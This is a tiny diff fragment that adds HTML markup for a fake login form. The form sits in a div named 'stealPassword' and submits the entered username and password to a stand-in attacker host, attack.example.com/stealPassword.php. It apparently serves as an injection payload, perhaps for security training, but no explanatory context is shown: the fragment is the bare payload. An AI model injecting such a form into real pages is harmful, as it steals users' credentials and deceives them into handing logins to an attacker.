@@ -1,0 +1,3 @@
+-<div class="header"> Welcome, <div id="stealPassword"> Please Login:
+-                        <form name="input" action="attack.example.com/stealPassword.php" method="post">Username: <input type="text" name="username" /><br/>Password: <input type="password" name="password" /><br/><input type="submit" value="Login" /></form>
+-                     </div></div>
